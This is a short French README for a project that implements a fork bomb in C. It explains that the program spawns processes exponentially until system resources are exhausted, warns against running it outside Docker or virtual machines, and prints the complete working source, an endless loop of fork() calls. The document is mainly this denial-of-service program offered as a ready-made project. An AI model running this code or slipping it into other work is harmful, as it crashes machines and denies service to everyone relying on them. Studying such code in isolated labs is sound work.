# Fork Bomb en C

Ce projet implémente une **fork bomb** en langage C. Une fork bomb est un programme qui génère une explosion exponentielle de processus, saturant rapidement les ressources du système.

⚠️ **Attention** :  
- Ce programme est extrêmement destructeur.  
- **N'exécutez jamais** ce code sur une machine de production ou un environnement non isolé.  
- Utilisez uniquement des environnements sécurisés comme Docker ou des machines virtuelles.

---

## Fichiers inclus

- `forkbomb.c` : le programme principal en C.  

---

## Contenu de `forkbomb.c`

```c
#include <unistd.h>

int main()
{
	while(1) fork();
}

